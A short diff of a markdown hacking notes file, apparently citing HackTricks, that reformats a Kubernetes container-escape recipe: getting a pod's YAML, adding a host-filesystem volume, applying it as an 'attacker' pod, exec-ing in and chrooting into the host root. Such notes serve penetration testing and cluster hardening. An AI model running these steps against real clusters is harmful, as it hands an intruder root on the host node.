@@ -371,7 +371,7 @@ Hints from (along with more) this page https://book.hacktricks.xyz/cloud-securit
 
 ### Simple escape with full rights:
 
-- kubectl get pod <name> [-n <namespace>] -o yaml
+- `kubectl get pod <name> [-n <namespace>] -o yaml`
 - mod with a new name, tag, and two volume changes:
     
     ```
@@ -388,6 +388,6 @@ Hints from (along with more) this page https://book.hacktricks.xyz/cloud-securit
       - name: host-fs
         mountPath: /root
     ```
-- kubectl apply -f attacker.yaml [-n <namespace>]
-- kubectl exec -it attacker-pod [-n <namespace>] -- bash
-- chroot /root /bin/bash
+- `kubectl apply -f attacker.yaml [-n <namespace>]`
+- `kubectl exec -it attacker-pod [-n <namespace>] -- bash`
+- `chroot /root /bin/bash`
